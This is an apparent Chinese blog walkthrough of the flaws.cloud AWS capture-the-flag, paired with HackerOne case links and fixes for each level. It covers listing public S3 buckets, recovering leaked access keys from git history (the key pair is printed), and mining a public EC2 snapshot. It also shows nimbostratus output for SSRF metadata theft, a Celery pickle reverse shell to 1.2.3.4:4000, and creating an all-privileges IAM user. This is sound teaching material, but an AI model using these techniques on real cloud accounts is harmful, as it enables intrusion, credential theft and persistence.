+<p><a href="https://link.zhihu.com/?target=https%3A//hackerone.com/reports/189023" target="_blank" rel="noopener">https://hackerone.com/reports/189023</a></p>
+<p>Zomato：错误配置导致的非法改动文件</p>
+<p><a href="https://link.zhihu.com/?target=https%3A//hackerone.com/reports/229690" target="_blank" rel="noopener">https://hackerone.com/reports/229690</a></p>
+<p>Reverb.com:错误配置导致的任意文件上传</p>
+<p><a href="https://link.zhihu.com/?target=https%3A//hackerone.com/reports/172549" target="_blank" rel="noopener">https://hackerone.com/reports/172549</a></p>
+<p>Ruby:错误配置导致的任意文件删除，移动</p>
+<p><a href="https://link.zhihu.com/?target=https%3A//hackerone.com/reports/209223" target="_blank" rel="noopener">https://hackerone.com/reports/209223</a></p>
+<p>Twitter:错误配置导致的文件读取，写入，删除</p>
+<p><a href="https://link.zhihu.com/?target=https%3A//hackerone.com/reports/129381" target="_blank" rel="noopener">https://hackerone.com/reports/129381</a></p>
+<h1 id="aws-ctf"><a href="#aws-ctf" class="headerlink" title="aws ctf"></a>aws ctf</h1><h2 id="ctf1-当-Everyone-具有访问权限"><a href="#ctf1-当-Everyone-具有访问权限" class="headerlink" title="ctf1 当 Everyone 具有访问权限"></a>ctf1 当 Everyone 具有访问权限</h2><p>题目地址：<a href="http://flaws.cloud/" target="_blank" rel="noopener">http://flaws.cloud/</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~/.local » host flaws.cloud</span><br><span class="line">flaws.cloud has address 52.218.222.10</span><br><span class="line">通过DNS解析，我们发现 flaws.cloud 指向 52.218.222.10，再经过反解，得知这台服务器在 s3-website-us-west-2.amazonaws.com</span><br></pre></td></tr></table></figure>
+
+<p>aws sync s3://flaws.cloud/ dir --no-sign-request --region us-west-2</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">--no-sign-request  不要签署请求。如果提供此参数，则不会加载凭据。</span><br><span class="line">--region（string）  要使用的地区。覆盖config / env设置。</span><br><span class="line">--debug（boolean）  打开调试日志记录。</span><br><span class="line">--endpoint-url（string） 使用给定的URL覆盖命令的默认URL。</span><br><span class="line">--no-verify-ssl（boolean） 默认情况下，AWS CLI在与AWS服务通信时使用SSL。对于每个SSL连接，AWS CLI将验证SSL证书。此选项会覆盖验证SSL证书的默认行为。</span><br><span class="line">--no-paginate（boolean） 禁用自动分页。</span><br><span class="line">--output（string） 命令输出的格式样式。</span><br><span class="line">--query（string） 用于过滤响应数据的JMESPath查询。</span><br><span class="line">--profile（string） 使用凭证文件中的特定配置文件。</span><br><span class="line">--version（string） 显示此工具的版本。</span><br><span class="line">--color（字符串） 打开/关闭颜色输出。</span><br><span class="line">--ca-bundle（string） 验证SSL证书时使用的CA证书包。覆盖config / env设置。</span><br><span class="line">--cli-read-timeout（int） 最大套接字读取时间，以秒为单位。如果该值设置为0，则套接字读取将阻塞而不会超时。</span><br><span class="line">--cli-connect-timeout（int） 最大套接字连接时间（秒）。如果该值设置为0，则套接字连接将阻塞而不会超时。</span><br><span class="line">https://docs.aws.amazon.com/cli/latest/reference/</span><br></pre></td></tr></table></figure>
+
+<p>下载S3 Bucket的数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws s3 sync s3://flaws.cloud/ dir --no-sign-request</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-08-20_15-36-44.png" alt="读取仓库内容"></p>
+<p><code>curl flaws.cloud/secret-dd02c7c.html to dir/secret-dd02c7c.html</code> 找到flag</p>
+<p><strong>修复方式</strong></p>
+<p>在 Bucket Permission 里删除相关权限配置</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/14898867985951.jpg" alt></p>
+<p><strong>hackerone案例</strong></p>
+<p><a href="https://hackerone.com/reports/57505" target="_blank" rel="noopener">Shopify S3 Bucket 信息泄露 – $500</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aws s3 sync s3://shopify.com.s3 dir --no-sign-request</span><br><span class="line">fatal error: An error occurred (NoSuchBucket) when calling the ListObjectsV2 operation: The specified bucket does not exist</span><br></pre></td></tr></table></figure>
+
+<h2 id="ctf2-Any-Authenticated-AWS-User"><a href="#ctf2-Any-Authenticated-AWS-User" class="headerlink" title="ctf2 Any Authenticated AWS User"></a>ctf2 Any Authenticated AWS User</h2><p>ctf地址：<a href="http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/" target="_blank" rel="noopener">http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/</a></p>
+<p><strong>提示：</strong></p>
+<p>下一个级别非常相似，略有不同。你将需要自己的AWS账户。你只需要<a href="https://aws.amazon.com/s/dm/optimization/server-side-test/free-tier/free_np/" target="_blank" rel="noopener">免费套餐</a>。</p>
+<p>你需要自己的AWS密钥，并且需要使用AWS CLI。与第一级类似，你可以发现此子域作为S3存储桶托管，其名称为“level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud”。</p>
+<p>它的权限过于宽松，但你需要自己的AWS账户才能看到内部的内容。使用你自己的帐户，你可以运行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws s3 --profile YOUR_ACCOUNT ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud</span><br></pre></td></tr></table></figure>
+
+<p><strong>测试过程：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~/aws » aws s3 sync s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud dir --no-sign-request</span><br><span class="line">fatal error: An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied</span><br></pre></td></tr></table></figure>
+
+<p>需要使用aws密钥，配置参考：<a href="https://docs.aws.amazon.com/zh_cn/cli/latest/userguide/cli-chap-configure.html" target="_blank" rel="noopener">快速配置 AWS CLI</a></p>
+<p>简单讲讲</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ aws configure --profile user2</span><br><span class="line">AWS Access Key ID [None]: # 刚刚获得的访问密钥ID</span><br><span class="line">AWS Secret Access Key [None]: # 刚刚获得的私有访问密钥</span><br><span class="line">Default region name [None]: us-west-2  # 你的服务地区</span><br><span class="line">Default output format [None]: json # 你需要返回的数据格式</span><br><span class="line"></span><br><span class="line">具体操作：https://razeencheng.com/post/tool-awscli-overview-1.html</span><br></pre></td></tr></table></figure>
+
+<p>操作完后会生成<code>~/.aws/config</code>和<code>~/.aws/credentials</code></p>
+<p>使用自己的aws账号未授权下载其他人S3。</p>
+<p>这里我用的是第三关的aws配置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws s3 --profile test1 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud</span><br></pre></td></tr></table></figure>
+
+<p><strong>修复方式</strong></p>
+<p>与打开“Everyone”权限类似，人们不小心打开了“<strong>任何经过身份验证的AWS用户</strong>”的权限。他们可能会错误地认为这只会是他们帐户的用户，而实际上它意味着拥有AWS账户的任何人。</p>
+<p><strong>hackerone案例</strong></p>
+<p><a href="https://hackerone.com/reports/131468" target="_blank" rel="noopener">Udemy S3 写权限控制不当</a></p>
+<p>同上使用自己的aws账号未授权操作其他用户S3</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">move: ./test.txt to s3://udemy-maven/test.txt</span><br><span class="line">delete: s3://udemy-maven/test.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="ctf3-aws-access-key-管理问题"><a href="#ctf3-aws-access-key-管理问题" class="headerlink" title="ctf3 aws access key 管理问题"></a>ctf3 aws access key 管理问题</h2><p><a href="http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/" target="_blank" rel="noopener">http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/</a></p>
+<p>同样使用命令，下载S3文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ dir --no-sign-request</span><br></pre></td></tr></table></figure>
+
+<p>发现.git目录</p>
+<ol>
+<li>查看git log，从下往上看</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git log</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-08-20_16-56-29.png" alt></p>
+<p>2.查看修改内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff f52ec03b227ea6094b04e43f475fb0126edb5a61</span><br></pre></td></tr></table></figure>
+
+<p>找到了删除的 aws access key &amp; secret</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/access_keys.txt b/access_keys.txt</span><br><span class="line">deleted file mode 100644</span><br><span class="line">index e3ae6dd..0000000</span><br><span class="line">--- a/access_keys.txt</span><br><span class="line">+++ /dev/null</span><br><span class="line">@@ -1,2 +0,0 @@</span><br><span class="line">-access_key AKIAJ366LIPB4IJKT7SA</span><br><span class="line">-secret_access_key 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</span><br></pre></td></tr></table></figure>
+
+<p>这里配置的信息地区需要写成<code>us-west-1</code></p>
+<p>列出 my-bucket的所有内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ aws s3 ls s3://my-bucket</span><br></pre></td></tr></table></figure>
+
+<p>列出my-bucket中MyFolder的所有内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ aws s3 ls s3://my-bucket/MyFolder</span><br></pre></td></tr></table></figure>
+
+<p>这里使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws --profile Wh0ale s3 ls</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-08-20_17-03-27.png" alt></p>
+<p><strong>修复方案</strong></p>
+<p>人们经常泄漏AWS密钥，然后试图掩盖他们的错误而不撤销密钥。你应该始终撤销可能已泄露或放错地方的任何AWS密钥（或任何机密）。经常修改你的密钥。</p>
+<p>删掉 .git，</p>
+<p>在 IAM -&gt; Users -&gt; Access Keys 里重新分配 aws access key &amp; secret</p>
+<p><strong>案例</strong></p>
+<p><a href="http://www.exfiltrated.com/research-Instagram-RCE.php" target="_blank" rel="noopener">Instagram的百万美元漏洞</a></p>
+<p>1.Ruby（Rails）RCE -- 服务器实际上反序列化了cookie，正确匹配了签名，并运行了有效负载</p>
+<p>2.Instagram实例只是简单地使用本地Postgres数据库实例。使用RCE，可以轻松读取配置文件以获取此数据库所需的凭据。我连接并转储了users表的内容。正如预期的那样，这完全由员工账户组成，包括Instagram和Facebook员工。总共有大约60个账户。</p>
+<p>3.查找sensu.instagram.com服务器上任何明显的配置缺陷时，我查看了服务器配置文件：<code>/etc/sensu/config.json</code>，文件中还存在一个相当明显的AWS密钥对。</p>
+<p>Github上的文件<a href="https://github.com/sensu/sensu-admin/blob/master/config/initializers/secret_token.rb" target="_blank" rel="noopener">secret_token.rb</a>有一个硬编码的Rails秘密令牌</p>
+<p><a href="https://summitroute.com/blog/2015/12/24/instagram_bounty_case_study_for_defense/" target="_blank" rel="noopener">“Instagram的百万美元漏洞”：防御案例研究</a></p>
+<h2 id="ctf4-快照利用"><a href="#ctf4-快照利用" class="headerlink" title="ctf4 快照利用"></a>ctf4 快照利用</h2><p><a href="http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/" target="_blank" rel="noopener">http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/</a></p>
+<p>对于一个没有权限限制的快照，任何人都可以通过挂载这个快照，并提取快照里的内容</p>
+<p>在设置nginx之后不久，快照就是由EC2构成的。</p>
+<blockquote>
+<p>你可以将EC2的磁盘卷快照作为备份。在这种情况下，快照已公开，但你需要找到它。</p>
+<p>要做到这一点，首先我们需要帐户ID，我们可以使用上一级别的AWS密钥获取该帐户ID：</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">~/aws » aws --profile flaws sts get-caller-identity  以验证你是否已代入 IAM 角色，获取Account</span><br><span class="line">&#123;</span><br><span class="line">    &quot;UserId&quot;: &quot;AIDAJQ3H5DC3LEG2BKSLC&quot;,</span><br><span class="line">    &quot;Arn&quot;: &quot;arn:aws:iam::975426262029:user/backup&quot;,</span><br><span class="line">    &quot;Account&quot;: &quot;975426262029&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此帐户所做的备份是EC2的快照。接下来，发现快照：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws --profile flaws ec2 describe-snapshots --owner-id 975426262029</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-08-20_17-48-19.png" alt></p>
+<p>我们指定<code>owner-id</code>只是为了过滤输出。为了好玩，在没有owner-id的情况下运行该命令，并注意<strong>所有公共可读</strong>的快照。默认情况下，快照是私有的，你可以通过指定其他帐户的帐户ID安全地在帐户之间进行转移，但是许多人只是将它们公开并忘记了它们。</p>
+<p><strong>使用自己申请的aws账号挂载靶机的公共aws快照。</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws --profile Wh0ale ec2 create-volume --availability-zone us-west-2a --region us-west-2（快照） --snapshot-id  snap-0b49342abd1bdcb89</span><br></pre></td></tr></table></figure>
+
+<p>但是前提好像是需要挂载的快照需要在同一个区域，因为没有信用卡，注册不了aws账号</p>
+<p>使用ctf3赛题上的aws凭证好像不太能挂载</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">An error occurred (UnauthorizedOperation) when calling the CreateVolume operation: You are not authorized to perform this operation. Encoded authorization failure message: aOP0jYFqY_OFZ9AkmTtFD_e5BLwawYzL3q_Is8SQpI6EYrux7NhvPgh7WtwLVb8NLBOSskHsNp45qX4-u_dt5rsybl33T8QHfCu0Sm7bc9FKCf61pjINL5B-G3g6AeX5ihCwQbWJwMRbolC3_ZWWKSUd5Ju4dFsZiW5OKgTFcfosYA5TjHUKolB41Dh5esDmIYikl2Mgz6U2uWoNkt6eNAzAZekkvM2QgAw1oKZWBg8X2qvK5cEeKZDlEFzNP9xKeYxdGNDy7o4izdY1l9PtDqwnfnV4z1BV4lGUPk7v8r1-ezHFN7G9jj1XOZeCv-WEKXE8xMiaNMDp9Xjosj_p-U3pTwacb1DWVVOXVE5J-WM4L3y7sEa3PWF493KwmlyZPKbDuXhzPfcpo4YcCgl-7W1hTYM0Fe5rx2EiGE1xFZ_4WqHT6AZ3xkQeqgjgWA8Wzsc375lvcRwLD5Tuu5-TeuvVgwxT7Ry_LYp0TvUzzlo94aKzyQqXElQMmkc5LpNHzwcpTinfg5balkK-WQIrOowm23ji_4VKXK04hTtHe56B44v5Oi1UsOxHmKqKJyogMkGNK0jTdKTEhRQGveEWutGQnGZlRwl3zlKa2gqSynJ2B-VVWj9mBuvCJdhnbFs-aTt8</span><br><span class="line">调用CreateVolume操作时发生错误（UnauthorizedOperation）：你无权执行此操作。</span><br></pre></td></tr></table></figure>
+
+<p>使用以下内容进行SSH：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i YOUR_KEY.pem ubuntu@ec2-54-191-240-80.us-west-2.compute.amazonaws.com</span><br></pre></td></tr></table></figure>
+
+<p>我们需要通过运行来安装这个额外的卷：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">lsblk</span><br><span class="line"></span><br><span class="line"># Returns:</span><br><span class="line">#  NAME    MAJ:MIN RM SIZE RO TYPE MOUNTPOINT</span><br><span class="line">#  xvda    202:0    0   8G  0 disk</span><br><span class="line">#  鈹斺攢xvda1 202:1    0   8G  0 part /</span><br><span class="line">#  xvdb    202:16   0   8G  0 disk</span><br><span class="line">#  鈹斺攢xvdb1 202:17   0   8G  0 part</span><br><span class="line"></span><br><span class="line">sudo file -s /dev/xvdb1</span><br><span class="line"></span><br><span class="line"># Returns:</span><br><span class="line">#  /dev/xvdb1: Linux rev 1.0 ext4 filesystem data, UUID=5a2075d0-d095-4511-bef9-802fd8a7610e, volume name &quot;cloudimg-rootfs&quot; (extents) (large files) (huge files)</span><br><span class="line"></span><br><span class="line"># Next we mount it</span><br><span class="line"></span><br><span class="line">sudo mount /dev/xvdb1 /mnt</span><br></pre></td></tr></table></figure>
+
+<p>一旦你附加了卷，你就会想要找一些可能告诉你密码的东西。运行<code>find / mnt -mtime -1</code>的某些变体将有助于查找最近的文件，你可以使用以下方法进一步过滤：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /mnt -type f -mtime -1 2&gt;/dev/null | grep -v &quot;/var/&quot; | grep -v &quot;/proc/&quot; | grep -v &quot;/dev/&quot; | grep -v &quot;/sys/&quot; | grep -v &quot;/run/&quot; | less</span><br></pre></td></tr></table></figure>
+
+<p>在ubuntu用户的主目录中是文件：<code>/ home / ubuntu / setupNginx.sh</code></p>
+<p>这将创建基本的HTTP身份验证用户<a href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/" target="_blank" rel="noopener">http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">htpasswd -b /etc/nginx/.htpasswd flaws nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M</span><br></pre></td></tr></table></figure>
+
+<p>输入账号密码登录flaws/nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M</p>
+<p>Good work getting in. This level is described at <a href="http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/" target="_blank" rel="noopener">http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/</a></p>
+<p><strong>修复：</strong></p>
+<p>AWS允许你制作EC2和数据库（RDS）的快照。其主要目的是进行备份，但人们有时会在忘记密码时使用快照来访问自己的EC2。这也允许攻击者访问事物。快照通常仅限于你自己的帐户，因此可能的攻击是攻击者可以访问AWS密钥，允许他们使用EC2启动/停止和执行其他操作，然后使用它来快照EC2并启动EC2你环境中的该卷可以访问它。与所有备份一样，你需要谨慎保护它们。</p>
+<h2 id="ctf5-元数据服务"><a href="#ctf5-元数据服务" class="headerlink" title="ctf5 元数据服务"></a>ctf5 元数据服务</h2><p><a href="http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/" target="_blank" rel="noopener">http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/</a></p>
+<p>查看元数据工具<strong>nimbostratus</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/andresriancho/nimbostratus.git</span><br><span class="line">cd nimbostratus</span><br></pre></td></tr></table></figure>
+
+<p>开启python虚拟环境，模块不冲突</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python3</span><br><span class="line">python3 -m venv venv</span><br><span class="line">python2</span><br><span class="line">pip install virtualenv</span><br><span class="line">virtualenv env</span><br><span class="line">cd env/bin</span><br><span class="line">source activate</span><br></pre></td></tr></table></figure>
+
+<p><strong>转储权限</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ nimbostratus dump-permissions --access-key=... --secret-key=...</span><br><span class="line">Starting dump-permissions</span><br><span class="line">These credentials belong to low_privileged_user, not to the root account</span><br><span class="line">Getting access keys for user low_privileged_user</span><br><span class="line">User for key AKIAIV...J6KVA is low_privileged_user</span><br><span class="line">&#123;u&apos;Statement&apos;: [&#123;u&apos;Action&apos;: u&apos;iam:*&apos;,</span><br><span class="line">                 u&apos;Effect&apos;: u&apos;Allow&apos;,</span><br><span class="line">                 u&apos;Resource&apos;: u&apos;*&apos;,</span><br><span class="line">                 u&apos;Sid&apos;: u&apos;Stmt1377108934836&apos;&#125;,</span><br><span class="line">                &#123;u&apos;Action&apos;: u&apos;sqs:*&apos;,</span><br><span class="line">                 u&apos;Effect&apos;: u&apos;Allow&apos;,</span><br><span class="line">                 u&apos;Resource&apos;: u&apos;*&apos;,</span><br><span class="line">                 u&apos;Sid&apos;: u&apos;Stmt1377109045369&apos;&#125;]&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>转储实例元数据</strong></p>
+<p>所有EC2实例都有<a href="http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/AESDG-chapter-instancedata.html" target="_blank" rel="noopener">元数据</a> ，可通过<a href="http://169.254.169.254/latest/meta-data/访问。此工具将从元数据中提取所有重要信息并显示给你。" target="_blank" rel="noopener">http://169.254.169.254/latest/meta-data/访问。此工具将从元数据中提取所有重要信息并显示给你。</a></p>
+<p>请记住，每个EC2实例都有自己的<code>http://169.254.169.254/</code>元数据提供程序，并且在不同的实例上运行此命令将产生不同的结果。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ nimbostratus dump-ec2-metadata</span><br><span class="line">Starting dump-ec2-metadata</span><br><span class="line">...</span><br><span class="line">Instance type: t1.micro</span><br><span class="line">AMI ID: ami-a02f66f2</span><br><span class="line">Security groups: django_frontend_nimbostratus_sg</span><br><span class="line">Availability zone: ap-southeast-1a</span><br><span class="line">Architecture: x86_64</span><br><span class="line">Private IP: 10.130.81.89</span><br><span class="line">User data script was written to user-data.txt</span><br></pre></td></tr></table></figure>
+
+<p>使用以下定义的漏洞从远程实例中提取元数据<code>core.utils.mangle.mangle</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ nimbostratus dump-ec2-metadata --mangle-function=core.utils.mangle.mangle</span><br><span class="line">Starting dump-ec2-metadata</span><br><span class="line">Request http://target.com/?url=http://169.254.169.254/...ta-data/</span><br><span class="line">Request http://target.com/?url=http://169.254.169.254/...ta-data/instance-type</span><br><span class="line">Request http://target.com/?url=http://169.254.169.254/...ta-data/instance-id</span><br><span class="line">...</span><br><span class="line">Instance type: t1.micro</span><br><span class="line">AMI ID: ami-a02f66f2</span><br><span class="line">Security groups: django_frontend_nimbostratus_sg</span><br><span class="line">Availability zone: ap-southeast-1a</span><br><span class="line">Architecture: x86_64</span><br><span class="line">Private IP: 10.130.81.89</span><br><span class="line">User data script was written to user-data.txt</span><br></pre></td></tr></table></figure>
+
+<p><strong>创建数据库快照</strong></p>
+<p>某些情况下，你拥有Amazon凭据，允许你访问<a href="http://aws.amazon.com/rds/" target="_blank" rel="noopener">RDS</a> API，但无权访问数据库本身（MySQL用户）。此工具允许你通过创建快照并还原它来访问存储在该数据库中的信息。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ nimbostratus snapshot-rds --access-key=... \</span><br><span class="line">                 --secret-key=... \</span><br><span class="line">                 --password foolmeonce --rds-name nimbostratus \</span><br><span class="line">                 --region ap-southeast-1</span><br><span class="line">Starting snapshot-rds</span><br><span class="line">Waiting for snapshot to complete in AWS... (this takes at least 5m)</span><br><span class="line">Waiting...</span><br><span class="line">Waiting for restore process in AWS... (this takes at least 5m)</span><br><span class="line">Waiting...</span><br><span class="line">Creating a DB security group which allows connections from any location and</span><br><span class="line">applying it to the newly created RDS instance. Anyone can connect to this</span><br><span class="line">MySQL instance at:</span><br><span class="line">    - Host: restored....rds.amazonaws.com</span><br><span class="line">    - Port: 3306</span><br><span class="line"></span><br><span class="line">    Using root:</span><br><span class="line">        mysql -u root -pfoolmeonce -h restored....rds.amazonaws.com</span><br></pre></td></tr></table></figure>
+
+<p><strong>Inject raw Celery message</strong></p>
+<p>Celery警告开发人员关于<a href="http://docs.celeryproject.org/en/latest/userguide/security.html#serializers" target="_blank" rel="noopener">不安全的泡菜</a> 序列化方法，但当然你会在现实生活中找到这样的部署。此工具将检查正在运行此工具的实例是否可以访问SQS，如果该SQS具有Celery队列，则验证Queue是否正在使用pickle并最终注入将在取消选择时执行任意命令的原始消息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ nimbostratus celery-pickle-exploit --access-key=... \</span><br><span class="line">                  --secret-key=... --reverse 1.2.3.4:4000 \</span><br><span class="line">                  --queue-name nimbostratus-celery --region ap-southeast-1</span><br><span class="line">Starting celery-exploit</span><br><span class="line">SQS queue nimbostratus-celery is vulnerable</span><br><span class="line">We can write to the SQS queue.</span><br><span class="line">Start a netcat to listen for connections at 1.2.3.4:4000 and press enter.</span><br><span class="line"></span><br><span class="line">Sent payload to SQS, wait for the reverse connection!</span><br></pre></td></tr></table></figure>
+
+<p><strong>创建新用户</strong></p>
+<p>如果你拥有允许你使用<a href="http://aws.amazon.com/iam/" target="_blank" rel="noopener">IAM</a>创建新用户的凭据，则此工具将创建它（具有访问所有Amazon资源的权限）并返回API密钥和密钥。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ nimbostratus create-iam-user --access-key=... --secret-key=...</span><br><span class="line">Starting create-iam-user</span><br><span class="line">Trying to create user &quot;bdkgpnenu&quot;</span><br><span class="line">User &quot;bdkgpnenu&quot; created</span><br><span class="line">Trying to create user &quot;bdkgpnenu&quot; access keys</span><br><span class="line">Created access keys for user bdkgpnenu. Access key: ..., access secret: ...</span><br><span class="line">Created user bdkgpnenu with ALL PRIVILEGES. User information:</span><br><span class="line">    * Access key: 